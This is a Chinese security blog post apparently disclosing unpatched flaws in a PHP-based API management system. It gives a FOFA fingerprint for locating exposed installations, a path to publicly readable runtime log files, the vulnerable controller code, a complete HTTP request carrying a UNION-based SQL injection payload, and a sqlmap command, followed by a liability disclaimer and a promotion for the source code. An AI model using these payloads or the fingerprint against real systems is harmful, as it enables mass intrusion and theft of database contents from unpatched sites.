#  (0day)全新优客API接口管理系统代码审计   
原创 Mstir  星悦安全   2024-11-12 03:43  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字关注我们 并设为  
星标  
## 0x00 前言  
  
**全新2024优客API接口管理系统，内置30+API接口，支持服务器信息，网站ICP备案，抖音无水印，QQ在线状态QQ头像，获取历史上的今天，IP签名档，ICO站标获，随机动漫图，网站标题获取，爱站权重获取，城市天气获取，随机一言，皮皮虾无水印，每日Bing壁纸，垃圾分类，查询手机号归属地，申通快递查询等接口功能.**  
  
**fofa指纹:"public/static/index/css/flaghome.css"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5fylhb95yo5Dxk0GWmW01OibqRphYicURXibEV1ePvcxGE9n39htWq3w3skLECYNS4D7fcNNLibj5FgDQ/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5fylhb95yo5Dxk0GWmW01Oib0oPU3BOXrtcrSV1sENiaeUOUNm6pic33sSED7upWibv9vftZnxAaZ8Amw/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5fylhb95yo5Dxk0GWmW01OiblP265TeVnV72KV0blbNicd6rAKPG7Kxmc85hm1HToPf26mqqvJvHuQw/640?wx_fmt=png&from=appmsg "")  
  
**框架:ThinkPHP 5.1.41 Debug:False**  
## 0x01 前台Log日志泄露漏洞  
##   
  
**该系统设置运行目录为根目录，且未对runtime 目录做限制，日志文件可被访问，导致漏洞产生.**  
  
**Payload (这种格式):**  
```
/runtime/log/202411/11.log
```  
  
**会记录一些包括SQL执行语句在内的敏感信息**![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fylhb95yo5Dxk0GWmW01OibcpFsarnE9Xe73WGWTgZsL8NO0xu8icicNnMQRUrtLeicrBO0x0sDjjDhg/640?wx_fmt=other&from=appmsg "")  
  
## 0x02 前台SQL注入漏洞  
##   
  
**位于 /index/controller/Index.php 控制器中的doc方法，通过POST传入id参数，并直接进入到SQL查询字句中，且无任何过滤，导致漏洞产生.**  
```
public function doc(){
  $doc = input('id');
  $api = Db::name('info')->where("doc='$doc'")->find();
  $info = Db::name('setup')->find();
  $list = $this->getTree();
  return $this->fetch('doc',[
                      'info' => $info,
                      'api' => $api,
                      'list' => $list
                      ]);
}
```  
  
**Payload:**  
```
POST /index/index/doc HTTP/1.1
Content-Length: 142
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Connection: close

id=') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),NULL-- -
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fylhb95yo5Dxk0GWmW01Oibn1OaewCibt0hwUpLQlUbaQrG4GhQTk3rB6smswPl5xqSpVRCJGbicFtA/640?wx_fmt=other&from=appmsg "")  
  
python sqlmap.py -r a.txt --level=3 --dbms=mysql  
标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转API源码关注公众号发送 241112 获取!免责声明:文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!  
